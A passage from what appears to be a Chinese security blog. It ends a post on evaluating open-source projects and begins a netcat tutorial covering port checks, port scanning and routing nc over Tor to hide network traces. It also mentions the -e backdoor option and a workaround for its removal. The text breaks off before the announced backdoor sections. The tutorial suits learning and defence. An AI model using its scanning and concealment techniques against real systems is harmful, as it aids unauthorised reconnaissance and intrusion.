<h2 id="★普及程度（用户的人气）"><a href="#★普及程度（用户的人气）" class="headerlink" title="★普及程度（用户的人气）"></a>★普及程度（用户的人气）</h2><p>　　所谓的普及程度，就是看开源项目的用户占有率。当然大伙儿不是搞市场调查的，花钱请市场调查公司也不现实。简单的办法就是用搜索引擎大致搜一下，就能看出几个候选项目使用的广泛度了。<br>　　还有另外一个判断普及程度的方式，就是看某个开源项目是否被知名的软件或者公司采用。比如 Firefox（算是知名软件）采用 Sqlite 来存储页面缓存和 cookie，这至少可以从侧面反映出 Sqlite 项目的优秀程度。<br>　　对于若干个候选项目，显然要优先考虑普及度高的那个。因为某个项目普及度高，至少说明（但不绝对）它比较成熟、稳定、安全。而且用的人多了之后，相应的文档也会多一些，碰到问题也容易找到人咨询。</p>
<h2 id="★活跃程度（开发的人气）"><a href="#★活跃程度（开发的人气）" class="headerlink" title="★活跃程度（开发的人气）"></a>★活跃程度（开发的人气）</h2><p>　　这里说的“活跃”，是指开发层面而言。<br>　　一般来说，一个项目越活越，则新功能的推出越快，对提交 bug 的响应也越快。还有些项目，由于开发人员不再继续开发（可能开发人员厌倦了、可能开发人员太忙了），从而导致活跃度很低。<br>　　不过也有例外——有些项目由于已经非常完善了，因此反而活跃程度很低。俺印象中：最近几年 bzip2 就很少有更新，但它是非常优秀的压缩库。</p>
<h2 id="★其它的风险"><a href="#★其它的风险" class="headerlink" title="★其它的风险"></a>★其它的风险</h2><p>　　最后来说说一些其它的风险。一般来说，只有当前几个因素都差不多的时候，才会来考虑其它风险。</p>
<h3 id="◇“单点故障”的风险"><a href="#◇“单点故障”的风险" class="headerlink" title="◇“单点故障”的风险"></a>◇“单点故障”的风险</h3><p>　　很多项目过于依赖【个人英雄主义——光靠着一两个大牛完成整个项目。一旦大牛出现意外，必然导致整个项目受到严重影响。典型的例子就是 ReiserFS 文件系统的创始人 Hans Reiser。这位老兄由于谋杀妻子的罪名成立，被判入狱15年（对 IT 八卦有兴趣的同学可以看“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Hans_Reiser">这里</a>”）。导致 ReiserFS 项目受到严重影响。<br>　　顺便说一下：<br>　　这类风险在开源界有个专门的术语叫“<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Bus_factor">Bus Factor</a>”，翻译成“巴士因子”或“卡车系数”。指的是——项目中有多少个关键人物【同时】出车祸，才会导致项目瘫痪。</p>
<h3 id="◇商业风险"><a href="#◇商业风险" class="headerlink" title="◇商业风险"></a>◇商业风险</h3><p>　　还有些开源项目被商业公司收购后，由于种种原因（商业、管理、政治等）导致该开源项目受到不利影响。比如上星期听说 Michael Widenius（MySQL 共同创始人）和 Marten Mickos（MySQL 前任 CEO）从 Sun 离职。再加上去年10月走掉了的 David Axmark（MySQL 共同创始人）。估计对 MySQL 的影响不小。</p>
<p>　　上述提到的几个考量指标，排在越前面的，权重越高。你在选型时需要综合考虑这几个因素。</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-07-16T15:54:54.000Z" title="2021/7/16 下午11:54:54">2021-07-16</time>发表</span><span class="level-item"><time dateTime="2021-07-16T15:59:56.482Z" title="2021/7/16 下午11:59:56">2021-07-16</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/%E7%BC%96%E7%A8%8B%E9%9A%8F%E6%83%B3/">编程随想</a></span><span class="level-item">2 小时读完 (大约14293个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/07/16/netcat/">netcat</a></h1><div class="content"><h1 id="扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”"><a href="#扫盲-netcat（网猫）的-N-种用法——从“网络诊断”到“系统入侵”" class="headerlink" title="扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”"></a>扫盲 netcat（网猫）的 N 种用法——从“网络诊断”到“系统入侵”</h1><p><strong>文章目录</strong></p>
<p>★引子<br>★netcat 是个啥玩意儿？<br>★netcat 能干啥？<br>★nc 命令行简介<br>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达<br>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口<br>★招数3：（渗透测试）用 nc 玩“端口扫描”<br>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）<br>★招数5：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）<br>★招数6：（隐匿性）用 nc 实现【彻底无痕】的 Web 访问<br>★招数7：（网络配置）基于 nc 的端口转发（Port Forward）<br>★招数8：（网络配置）基于 nc 的代理转发（Proxy Forward）<br>★招数9：（系统管理）用 nc 传输文件<br>★招数10：（系统管理）用 nc 远程备份整个磁盘<br>★招数11：（入侵手法）用 nc 开启【被动】连接型后门<br>★招数12：（入侵手法）用 nc 开启【主动】连接型后门<br>★附录：netcat 的【其它变种】</p>
<hr>
<h2 id="★引子"><a href="#★引子" class="headerlink" title="★引子"></a>★引子</h2><p>　　这些年来，俺在博客上写了若干“信息安全教程”，其中不免会涉及到【网络配置】。<br>　　由于读者中有很多是“技术菜鸟”，经常在配置网络的时候卡壳——有些人是因为粗心，还有些是被系统的防火墙干扰了（误导了）。<br>　　今天这篇，一个主要目的就是：教你如何用 netcat 这个牛逼的小工具进行网络诊断、网络配置、系统管理 ……<br>　　此文的另一个目的是：介绍黑客/骇客是如何利用 netcat 这个工具来辅助入侵。所谓【知己知彼】，注重安全防范的同学，也应该稍微了解一些入侵者的手法。</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">---------------------<br>|<span class="hljs-string">      /\_/\        </span>|<br>|<span class="hljs-string">     / 0 0 \       </span>|<br>|<span class="hljs-string">    ====v====      </span>|<br>|<span class="hljs-string">     \  W  /       </span>|<br>|<span class="hljs-string">     </span>|<span class="hljs-string">     </span>|<span class="hljs-string">     _ </span>|<br>|<span class="hljs-string">     / ___ \    /  </span>|<br>|<span class="hljs-string">    / /   \ \  </span>|<span class="hljs-string">   </span>|<br>|<span class="hljs-string">   (((-----)))-&#x27;   </span>|<br>|<span class="hljs-string">    /              </span>|<br>|<span class="hljs-string">   (      ___      </span>|<br>|<span class="hljs-string">    \__.=</span>|<span class="hljs-string">___E     </span>|<br>|<span class="hljs-string">           /       </span>|<br>---------------------<br></code></pre></td></tr></table></figure>


<h2 id="★netcat-是个啥玩意儿？"><a href="#★netcat-是个啥玩意儿？" class="headerlink" title="★netcat 是个啥玩意儿？"></a>★netcat 是个啥玩意儿？</h2><p>　　netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【<strong>网络上的瑞士军刀</strong>】。<br>　　它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。</p>
<h2 id="★netcat-能干啥？"><a href="#★netcat-能干啥？" class="headerlink" title="★netcat 能干啥？"></a>★netcat 能干啥？</h2><h3 id="◇概述"><a href="#◇概述" class="headerlink" title="◇概述"></a>◇概述</h3><p>　　简而言之，nc 是一个【命令行】工具，能够让你很方便、很灵活地地操纵【传输层协议】（这里所说的“传输层协议”指的是 OSI 模型中的第4层，主要是 TCP ＆ UDP）。</p>
<h3 id="◇nc-的变种"><a href="#◇nc-的变种" class="headerlink" title="◇nc 的变种"></a>◇nc 的变种</h3><p>　　由于 nc 是如此牛逼，而它本身又很小（不但软件很小，源代码也很少）。很容易就衍生出一大堆【变种】。不同的变种，会在原有 nc 的基础上增加一些新功能。<br>　　由于变种之间存在差异。在本文的开头部分，俺有必要先声明一下：<strong>这篇教程的内容，主要基于 OpenBSD 社区的变种</strong>（也叫“OpenBSD netcat”或“netcat-openbsd”）<br>　　顾名思义，这是由 OpenBSD 社区重写的 netcat，主要增加了对“IPv6、proxy、Unix sockets”等功能的支持。另外，在细节上也有若干完善。<br>　　虽然它出自 OpenBSD 社区，但很多主流 Linux 发行版的官方软件仓库已包含这个变种（比如说：Debian 家族、Arch 家族、openSUSE 家族、Gentoo 家族……）。<br>　　为了打字省力，本文后续部分提到的 nc，除非专门注明，否则都是指：netcat 的 OpenBSD 变种。如果俺要称呼【原始】的那个 netcat，俺会称之为“原版 nc”（洋文叫做“traditional netcat”）。<br>　　另，<br>　　在本文末尾，俺单独开一个章节，简单聊聊 nc 的其它几个变种。</p>
<h2 id="★nc-命令行简介"><a href="#★nc-命令行简介" class="headerlink" title="★nc 命令行简介"></a>★nc 命令行简介</h2><p>　　要使用 nc，你就需要在【命令行】中与它打交道（它所有的功能，都以命令行的方式呈现给你用）。</p>
<h3 id="◇nc-命令行的常规形式"><a href="#◇nc-命令行的常规形式" class="headerlink" title="◇nc 命令行的常规形式"></a>◇nc 命令行的常规形式</h3><p>　　一般来说，nc 的命令行包括如下几个部分：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nc</span> 命令选项 主机 端口<br></code></pre></td></tr></table></figure>
<p><strong>命令选项</strong><br>　　这部分可能包含 0~N 个选项<br>　　（注：这部分最复杂，下一个小节单独聊）<br><strong>主机</strong><br>　　这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。<br><strong>端口</strong><br>　　这部分可能没有，可能是单个端口，可能是端口范围。<br>　　对于“端口范围”，以两个数字分别表示“开始和结束”，中间以【半角减号】相连。举例：<code>1-1024</code></p>
<h3 id="◇何为“命令行选项”？"><a href="#◇何为“命令行选项”？" class="headerlink" title="◇何为“命令行选项”？"></a>◇何为“命令行选项”？</h3><p>　　简单来说，nc 提供了一大堆【命令行选项】，分别对应它提供的功能。每个选项都是“单字母”滴。有些选项需要带【选项值】，有些不需要。<br>　　你要使用的选项都放在 <code>nc</code> 这个命令之后，每个选项前面要有一个【半角减号】，选项之间以空格分开。<br>　　举例：<br>　　在下面这个例子中，分别用到了三个选项（<code>l、p、v</code>），其中 <code>12345</code> 是选项 <code>p</code> 所带的【选项值】。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -l -p <span class="hljs-number">12345</span> -v<br></code></pre></td></tr></table></figure>

<p>　　如果你的系统中已经有 nc（且 nc 已添加到【PATH 环境变量】），在命令行中执行如下，就可以看到它支持的全部命令选项的列表。</p>
<figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -h</span><br></code></pre></td></tr></table></figure>

<p>　　顺便说一下：在上述命令的输出中，如果第一行包含 <code>OpenBSD</code> 这个单词，就说明你当前用的“网猫”是 OpenBSD 变种。</p>
<h3 id="◇【常用的】命令行选项"><a href="#◇【常用的】命令行选项" class="headerlink" title="◇【常用的】命令行选项"></a>◇【常用的】命令行选项</h3><p>　　由于上述命令显示的帮助是洋文。为了照顾新手，俺稍作解释（只列出【常用的】那些）。</p>
<table>
<thead>
<tr>
<th>选项</th>
<th>是否有“选项值”</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>h</td>
<td>NO</td>
<td>输出 nc 的帮助</td>
</tr>
<tr>
<td>v</td>
<td>NO</td>
<td>在网络通讯时，显示详细的输出信息 注：建议新手多用该选项，出错时帮你诊断问题</td>
</tr>
<tr>
<td>n</td>
<td>NO</td>
<td>对命令行中的“主机”，【不】进行域名解析 注：如果“主机”是“点分格式”的 IP 地址，需要用该选项； 如果“主机”是“域名”形式，【不能】用该选项</td>
</tr>
<tr>
<td>p</td>
<td>YES</td>
<td>指定“端口号”</td>
</tr>
<tr>
<td>l</td>
<td>NO</td>
<td>开启“监听模式”，nc 作为【服务端】 注：如不加该选项，nc 默认作为客户端</td>
</tr>
<tr>
<td>u</td>
<td>NO</td>
<td>使用 UDP 协议 注：如不加该选项，默认是 TCP 协议</td>
</tr>
<tr>
<td>w</td>
<td>YES</td>
<td>设置连接的超时间隔（N 秒）</td>
</tr>
<tr>
<td>q</td>
<td>YES</td>
<td>让 nc 延时（N 秒）再退出</td>
</tr>
<tr>
<td>z</td>
<td>NO</td>
<td>开启“zero-I/O 模式” 注：该选项仅用于“端口扫描”，后面会聊到</td>
</tr>
<tr>
<td>k</td>
<td>NO</td>
<td>配合 <code>-l</code> 选项使用，可以重复接受客户端连接。 注：“原版 nc”的该选项用来开启“TCP keepalive” 这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>X</td>
<td>YES</td>
<td>指定代理的类型（具体用法，后面会聊到） 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>x</td>
<td>YES</td>
<td>以 <code>IP:port</code> 的格式指定代理的位置。 注：“原版 nc”【没有】该选项。这是“原版 nc”与“OpenBSD 变种”之间的差异之一</td>
</tr>
<tr>
<td>e</td>
<td>YES</td>
<td>启动某个进程，把该进程的“标准输入输出”与网络通讯【对接】 注：通常用该选项开启一个网络后门 “OpenBSD 变种”基于安全考虑，已去掉该选项， 但还是能用间接的方式达到同样的效果 :)</td>
</tr>
</tbody></table>
<p>　　汇总上述表格，只是用来【速查】。俺会在后续章节具体介绍每个命令选项的详细用法。</p>
<h3 id="◇命令行选项的【合写】形式"><a href="#◇命令行选项的【合写】形式" class="headerlink" title="◇命令行选项的【合写】形式"></a>◇命令行选项的【合写】形式</h3><p>　　有时候要同时用到多个选项，可以“合写在一起”，在前面共用一个【半角减号】。<br>　　还拿刚才俺举的例子，以下几种写法是【等价】滴。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lp <span class="hljs-number">12345</span> -v<br><span class="hljs-attribute">nc</span> -l -v -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">12345</span><br><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure>


<h3 id="◇如何强行终止-nc？"><a href="#◇如何强行终止-nc？" class="headerlink" title="◇如何强行终止 nc？"></a>◇如何强行终止 nc？</h3><p>　　一般来说，在命令行环境下，你可以用【Ctrl C】这个组合键来强行终止当前运行的进程。<br>　　对 nc，你同样可以这么干。</p>
<h2 id="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"><a href="#★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达" class="headerlink" title="★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达"></a>★招数1：（网络诊断）测试某个远程主机的【监听】端口是否可达</h2><h3 id="◇使用场景"><a href="#◇使用场景" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　经常有这种需求，要判断某个主机的监听端口是否能连上。<br>　　导致监听端口【无法】，通常有两种原因：<br>其一，这个监听端口根本就【没开启】；<br>其二，监听端口虽然开启，但是被防火墙阻拦了。<br>　　对第1个原因，（如果你能在该主机上运行命令）可以直接用 <code>netstat</code> 这个命令查看监听端口是否开启<br>　　但对于第2个原因，<code>netstat</code> 就用不上了。这时候就可以用 nc 来帮你搞定。</p>
<h3 id="◇方法"><a href="#◇方法" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　用如下命令可以测试某个 IP 地址（<code>x.x.x.x</code>）上的某个监听端口（<code>xx</code>）是否开启。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>

<p>　　上述命令用到了如下几个选项：</p>
<p><strong>选项 <code>-v</code></strong><br>　　如果你是 nc 的新手，俺建议总是带上这个选项——通过更详细的输出，能帮你搞明白状况。<br>　　在本文后续的举例中，俺会尽量都加上这个选项（但这段话就不再重复唠叨啦）</p>
<p><strong>选项 <code>-n</code></strong><br>　　由于测试的是【IP 地址】，用该选项告诉 nc，【无须】进行域名（DNS）解析；<br>　　反之，如果你要测试的主机是基于【域名】，就【不能】用“选项 -n”。</p>
<h3 id="◇补充说明：超时设置"><a href="#◇补充说明：超时设置" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　在测试链接的时候，如果你【没】使用 <code>-w</code> 这个超时选项，默认情况下 nc 会等待很久，然后才告诉你连接失败。<br>　　如果你所处的网络环境稳定且高速（比如：局域网内），那么，你可以追加“<code>-w</code> 选项”，设置一个比较小的超时值。在下面的例子中，超时值设为3秒。</p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -nv -w <span class="hljs-number">3</span> <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> xx<br></code></pre></td></tr></table></figure>


<h3 id="◇补充说明：UDP"><a href="#◇补充说明：UDP" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　通常情况下，要测试的端口都是 TCP 协议的端口；如果你碰到特殊情况，需要测试某个 UDP 的端口是否可达。nc 同样能胜任。只需要追加 <code>-u</code> 选项。</p>
<h2 id="★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口"><a href="#★招数2：（网络诊断）判断防火墙是否“允许-or-禁止”某个端口" class="headerlink" title="★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口"></a>★招数2：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口</h2><h3 id="◇使用场景-1"><a href="#◇使用场景-1" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　前一个章节（招数1）的场景是——已经有某个网络软件开启了监听端口，然后用 nc 测试端口是否可达。<br>　　现在换另一个场景：<br>　　假设你正在配置防火墙规则，禁止 TCP 的 <code>8080</code> 端口对外监听。那么，你如何【验证】自己的配置是 OK 滴？<br>　　更进一步说：如果当前【没有】任何软件开启 <code>8080</code> 这个监听端口，你如何判断：该端口号是否会被防火墙阻拦？<br>　　为了叙述方便，设想如下场景：<br>有两台主机——“主机C”充当客户端，“主机S”充当服务端。<br>然后要判断“主机S”上的防火墙是否会拦截其它主机对 <code>8080</code> TCP 端口的连接。</p>
<h3 id="◇方法-1"><a href="#◇方法-1" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　在“主机S”上运行 nc，让它在 8080 端口，命令如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv -p <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-l</code></strong><br>　　这个选项会让 nc 进入监听模式。</p>
<p><strong>选项 <code>-p</code></strong><br>　　这个选项有“选项值”，也就是具体端口号。</p>
<p>　　然后在“主机C”上运行 nc，测试“主机S”上的 8080 端口是否可达（具体的命令行参见前一章节“招数1”）</p>
<h3 id="◇补充说明：是否省略“-p”？"><a href="#◇补充说明：是否省略“-p”？" class="headerlink" title="◇补充说明：是否省略“-p”？"></a>◇补充说明：是否省略“-p”？</h3><p>　　某些 nc 的变种，在开启监听模式时，可以省略“<code>-p</code>”，上述命令变为如下：</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lv <span class="hljs-number">8080</span><br></code></pre></td></tr></table></figure>
<p>　　但考虑到兼容性，（在后续章节中）俺总是写上 <code>-p</code> 选项。</p>
<h3 id="◇补充说明：如何让-nc-的监听端口【持续开启】"><a href="#◇补充说明：如何让-nc-的监听端口【持续开启】" class="headerlink" title="◇补充说明：如何让 nc 的监听端口【持续开启】"></a>◇补充说明：如何让 nc 的监听端口【持续开启】</h3><p>　　在默认情况下，nc 开启 listen 模式充当服务端，在接受【第一次】客户端连接之后，就会把监听端口关闭。<br>　　为啥会这样捏？因为当年设计 nc 更多的是作为某种网络诊断/配置工具，并【不是】真拿它当服务端软件来用的。<br>　　如果你想要让 nc 始终监听模式，使之能【重复】接受客户端发起的连接，可以追加 <code>-k</code> 选项。</p>
<h3 id="◇补充说明：UDP-1"><a href="#◇补充说明：UDP-1" class="headerlink" title="◇补充说明：UDP"></a>◇补充说明：UDP</h3><p>　　上述举例是基于 TCP 协议。如果你要测试 UDP 协议，要记得【两边】的 nc 都要追加 <code>-u</code> 选项。</p>
<h2 id="★招数3：（渗透测试）用-nc-玩“端口扫描”"><a href="#★招数3：（渗透测试）用-nc-玩“端口扫描”" class="headerlink" title="★招数3：（渗透测试）用 nc 玩“端口扫描”"></a>★招数3：（渗透测试）用 nc 玩“端口扫描”</h2><h3 id="◇使用场景-2"><a href="#◇使用场景-2" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　在“招数1”里面介绍了：如何测试【单个】端口是否可达。<br>　　扩展一下：如果你要测试的不止一个端口，而是某个【范围】的端口。这种行为有个专门的术语叫【端口扫描】。<br>　　“端口扫描”是一把双刃剑——“黑帽子”用这招进行信息收集，为后续的入侵做铺垫；“白帽子”用这招来进行“渗透测试”，以排查自己系统中【尚未屏蔽】的对外监听端口。<br>　　作为一款牛逼的网络瑞士军刀，nc 当然可以用来干这事儿啦。<br>　　顺便说一下：<br>不论是 TCP 还是 UDP，协议规定的【有效】端口号范围都是：<code>1</code> ~ <code>65535</code></p>
<h3 id="◇方法-2"><a href="#◇方法-2" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　下面这个命令，用来扫描 IP 地址为 <code>x.x.x.x</code> 的主机，扫描的端口范围从 <code>1</code> 到 <code>1024</code></p>
<figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">nc -znv <span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span>.<span class="hljs-symbol">x</span> <span class="hljs-number">1</span><span class="hljs-number">-1024</span><br></code></pre></td></tr></table></figure>

<p><strong>选项 <code>-z</code></strong><br>　　意思是：开启“zero-I/O 模式”。该模式指的是：nc 只判断某个监听端口是否能连上，连上后【不】与对端进行数据通讯。<br><strong>选项 <code>-n</code></strong><br>　　（前面已聊过，参见“招数1”）<br><strong>选项 <code>-v</code></strong><br><code>-v</code> 选项前面也聊过，这里要特地强调一下。<br>　　对 nc 的其它用法，<code>-v</code> 选项是可加可不加滴；但对于“端口扫描”而言，一定要有这个选项——否则你【看不到】扫描结果。</p>
<h3 id="◇补充说明：优化输出"><a href="#◇补充说明：优化输出" class="headerlink" title="◇补充说明：优化输出"></a>◇补充说明：优化输出</h3><p>　　玩“端口扫描”的时候，“<code>-v</code> 选项”会把“成功/失败”的结果统统打印出来。<br>　　通常大伙儿关注的都是“扫描成功”的那些端口。因此，可以用如下命令过滤一下，只打印扫出来的端口。</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -znv x.x.x.x <span class="hljs-number">1</span>-<span class="hljs-number">1024</span>  <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | grep succeeded<br></code></pre></td></tr></table></figure>
<p>　　由于“<code>-v</code> 选项”产生的输出位于【stderr】，上述命令中的 <code>2&gt;&amp;1</code> 用来把【stderr】合并到【stdout】（注：这种写法只适用于 POSIX 系统上的 shell）<br><code>grep</code> 命令用来进行【过滤】。对于 Windows 系统，默认【没有】<code>grep</code> 命令，需改用 <code>find</code> 命令过滤。</p>
<h3 id="◇补充说明：超时设置-1"><a href="#◇补充说明：超时设置-1" class="headerlink" title="◇补充说明：超时设置"></a>◇补充说明：超时设置</h3><p>　　如果你要扫描的端口范围，跨度比较大，超时值要【恰到好处】——<br>超时值太大，会浪费时间；超时值太小，可能会遗漏某些端口（端口本身开放，但 nc 还没来得及连上就超时了）<br>　　具体如何设置，参见“招数1”的“补充说明”。</p>
<h3 id="◇补充说明：【并发】扫描"><a href="#◇补充说明：【并发】扫描" class="headerlink" title="◇补充说明：【并发】扫描"></a>◇补充说明：【并发】扫描</h3><p>　　如果你设置了较小的超时值，依然嫌慢，还可以用【并发】扫描的方式，进一步提升效率。<br>　　简而言之就是：同时运行多个 nc，分别扫描不同的端口范围。</p>
<h2 id="★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）"><a href="#★招数4：（隐匿性）如何让-nc-走暗网（以-Tor-为例）" class="headerlink" title="★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）"></a>★招数4：（隐匿性）如何让 nc 走暗网（以 Tor 为例）</h2><h3 id="◇使用场景-3"><a href="#◇使用场景-3" class="headerlink" title="◇使用场景"></a>◇使用场景</h3><p>　　（本章节针对那些有【特殊需求】的家伙。技术菜鸟可以略过）<br>　　如果你想用 nc 干一些“不为人知”的事情，首先要考虑的是——如何消除【网络层面】的踪迹。<br>　　最容易想到的当然就是——让 nc 走暗网（比如 Tor）。本文以下部分称之为【nc over Tor】。<br>　　顺便说一下：“原版 nc”【不支持】代理，而 nc 的“OpenBSD 变种”支持各种代理。这是两种 nc 之间的关键性差异之一。</p>
<h3 id="◇方法-3"><a href="#◇方法-3" class="headerlink" title="◇方法"></a>◇方法</h3><p>　　为了支持代理，nc 的“OpenBSD 变种”增加了两个选项：<code>-X</code> 与 <code>-x</code></p>
<p><strong>选项 <code>-x</code></strong><br>　　该选项表示【代理的位置】，以 <code>x.x.x.x:xxx</code> 的形式表示（中间是【半角冒号】）。</p>
<p><strong>选项 <code>-X</code></strong><br>　　该选项表示【代理的类型】，含义如下：</p>
<table>
<thead>
<tr>
<th>选项值</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>5</td>
<td>SOCKS5 代理</td>
</tr>
<tr>
<td>4</td>
<td>SOCKS4 代理</td>
</tr>
<tr>
<td>connect</td>
<td>CONNECT 型的 HTTP 代理</td>
</tr>
</tbody></table>
<p>　　首先，确保你本机已经运行了 Tor；<br>　　然后，拿俺的域名测试一下。如果 nc 的输出中包含 <code>succeeded</code>（参见下面的第2行），说明 OK 啦——nc 已经能通过 Tor 联网。</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">nc</span> <span class="hljs-selector-tag">-X</span> 5 <span class="hljs-selector-tag">-x</span> 127.0.0.1<span class="hljs-selector-pseudo">:9050</span> <span class="hljs-selector-tag">-q</span> 3 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443<br><br><span class="hljs-selector-tag">Connection</span> <span class="hljs-selector-tag">to</span> <span class="hljs-selector-tag">program-think</span><span class="hljs-selector-class">.blogspot</span><span class="hljs-selector-class">.com</span> 443 <span class="hljs-selector-tag">port</span> <span class="hljs-selector-attr">[tcp/https]</span> <span class="hljs-selector-tag">succeeded</span>!<br></code></pre></td></tr></table></figure>
<p>（注：如果你用的是“Tor Browser”，上述命令中的“<code>-x</code> 选项值”改为 <code>127.0.0.1:9150</code>）</p>
<h3 id="◇补充说明：延时退出"><a href="#◇补充说明：延时退出" class="headerlink" title="◇补充说明：延时退出"></a>◇补充说明：延时退出</h3><p>　　在上述举例中，俺用到了一个新的 <code>-q</code> 选项。主要考虑到：本博客的 Web Server 位于【公网】。<br>　　当你用 nc 连接【公网】上的服务器，因为【公网】的传输质量会受到诸多因素的影响，最好加 <code>-q</code> 选项，让 nc【延时】退出。<br>　　在俺的示例中，延时3秒。实际操作时，要根据你的网络环境调整。</p>
<h3 id="◇补充说明：Tor-暗网的好处"><a href="#◇补充说明：Tor-暗网的好处" class="headerlink" title="◇补充说明：Tor 暗网的好处"></a>◇补充说明：Tor 暗网的好处</h3><p>　　关于 Tor 的用处/好处，俺在博客上重复唠叨的次数，已经数不清了。<br>　　（简而言之）由于 Tor 暗网的线路会经历“三级跳”＆“三重套”，而且其线路每隔10分钟就会【随机】变换一次。这种变态的玩法，可以让【网络层面】的逆向追溯变得非常非常困难。</p>
<h3 id="◇补充说明：域名解析"><a href="#◇补充说明：域名解析" class="headerlink" title="◇补充说明：域名解析"></a>◇补充说明：域名解析</h3><p>　　当你用刚才的招数做到【nc over Tor】之后，一旦 nc 的网络行为需要解析域名，会自动通过 Tor 的 SOCKS 代理进行【远程域名解析】。<br>　　也就是说，“DNS 协议”相关数据流也经过 Tor 暗网——这样既可以【防止】“域名解析”暴露你的网络行为，还可以避免 GFW 的“域名污染”。</p>
<h3 id="◇补充说明：设置别名（alias）"><a href="#◇补充说明：设置别名（alias）" class="headerlink" title="◇补充说明：设置别名（alias）"></a>◇补充说明：设置别名（alias）</h3><p>　　如果你比较懒，觉得每次都输入上述两个代理选项太麻烦，可以为 nc 设置一个【别名】（命令如下）</p>
